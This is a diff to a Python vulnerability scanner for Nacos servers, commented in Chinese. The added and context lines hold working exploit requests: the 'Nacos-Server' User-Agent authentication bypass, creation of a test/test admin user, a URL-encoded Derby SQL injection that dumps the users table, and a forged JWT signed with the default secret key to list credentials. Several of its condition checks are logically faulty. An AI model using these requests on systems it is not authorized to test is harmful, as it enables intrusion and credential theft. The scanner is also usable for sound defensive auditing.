@@ -51,9 +51,6 @@ def es_unauthorized():
 
 # nacos漏洞扫描
 def nacos_vuln_scan():
-    hearder={
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)'
-    }
 
     hearders = {
         'User-Agent': 'Nacos-Server',
@@ -78,7 +75,7 @@ def nacos_vuln_scan():
         poc_dir = "/nacos/v1/auth/users?pageNo=1&pageSize=9"
         try:
             # 忽略ssl证书验证
-            res = requests.get(url+poc_dir,headers=hearder,allow_redirects=False,timeout=2,verify=False)
+            res = requests.get(url+poc_dir,headers=hearders,allow_redirects=False,timeout=2,verify=False)
             res.encoding='utf-8'
             restext = res.text
             if 'totalCount' and 'username' and 'password' in restext:
@@ -100,15 +97,37 @@ def nacos_vuln_scan():
             response_text = response.text
             if '200' and 'create' and 'user' and 'ok' in response_text:
                  # 忽略ssl证书验证
-                res = requests.get(url+poc_dir,headers=hearder,allow_redirects=False,timeout=2,verify=False)
+                res = requests.get(url+poc_dir,headers=hearders,allow_redirects=False,timeout=2,verify=False)
                 res.encoding='utf-8'
                 restext = res.text
                 if 'test' and 'username' in restext:
                     print("[+]"+" "+formatted_time+" "+"目标："+" "+url+poc_dir+" "+"存在权限绕过漏洞并新增用户(test/test)")
         except:
             pass
-            
 
+        # Nacos Derby SQL注入漏洞验证
+        nacos_sql_inject_dir = "/nacos/v1/cs/ops/derby?sql=%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72%73"
+        try:
+            # 忽略ssl证书验证
+            res_sql = requests.get(url+nacos_sql_inject_dir,headers=hearders,allow_redirects=False,timeout=2,verify=False)
+            res_sql.encoding='utf-8'
+            res_sql_text = res_sql.text
+            if '200' and 'USERNAME' and 'PASSWORD' and 'true' in res_sql_text:
+                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+nacos_sql_inject_dir+" "+"存在 Nacos Derby SQL注入漏洞")
+        except:
+            pass
+
+        # nacos默认密钥导致的未授权访问漏洞
+        nacos_secret_dir = "/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ&pageNo=1&pageSize=9"
+        try:
+            # 忽略ssl证书验证
+            res_secret = requests.get(url+nacos_secret_dir,headers=hearders,allow_redirects=False,timeout=2,verify=False)
+            res_secret.encoding='utf-8'
+            res_secret_text = res_secret.text
+            if 'totalCount' and 'username' and 'password' and 'pageItems' in res_secret_text:
+                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+nacos_secret_dir+" "+"存在 Nacos secret.key默认密钥 未授权访问漏洞")
+        except:
+            pass
 
 
 if __name__ == "__main__":
